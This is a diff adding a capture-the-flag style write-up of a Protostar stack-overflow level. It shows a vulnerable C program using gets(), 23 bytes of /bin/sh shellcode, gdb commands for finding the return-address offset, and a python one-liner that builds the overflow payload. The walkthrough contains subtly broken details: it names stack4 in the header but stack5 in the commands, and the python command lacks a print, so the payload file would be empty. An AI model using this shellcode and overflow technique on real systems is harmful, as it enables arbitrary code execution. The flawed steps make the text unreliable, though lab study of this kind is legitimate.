@@ -1,0 +1,50 @@
+/opt/protostar/bin/stack4
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+
+This time we get as little as possible. But still, we have gets function, which means buffer overflow is a possibility. There is no win() function this time - we need to redirect code execution to commands that we also need to inject. So how would exploitation look like? 
+
+We need to put a shellcode (byte code that can be executed, i.e. calling /bin/bash) on the stack and overwrite return address pointer in a way that it points to our code. This way we can execute arbitrary code on a machine.
+
+For this level we can use someone else's shellcode, so let's do a quick search for one that executes /bin/bash on 32bit linux.
+
+http://shell-storm.org/shellcode/files/shellcode-827.php
+
+Those are the bytes we need to put on the stack:
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+Next step is to figure out where RA is stored and how many bytes do we need to enter.
+
+> gdb stack5
+> start
+> disassemble
+> b *0x080483d9
+> p $ebp+4
+> x/32x $esp
+
+Once again, return address is stored at 0xbffff7cc but our buffer starts at 0xbffff780.
+0xbffff7cc - 0xbffff780 = 76 bytes 
+
+Our shellcode has 23 bytes, so we need 76-23 = 53 other characters. We can start with shellcode, followed by some 'A's and then overwrite return address to jump to the begginning of buffer.
+
+Let's try following:
+> python -c "('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*53 + '\x80\xf7\xff\xbf')" > ~/stack5p
+> gdb stack5
+> run < ~/stack5p
+> Executing new program: /bin/dash
+> Program exited normally
+
+But when we try to run it in terminal we only get a segmentation fault.
+Once again - this is an expected behaviour - after calling to /bin/dash code flow execution returns to from where it jumped. Which means after overwritten return address and since there isn't any sensible code to execute it crashes.
+
+We could use more sophisticated shellcode, that will handle this issue, but that's not the point of this excersise. For now - we won :)
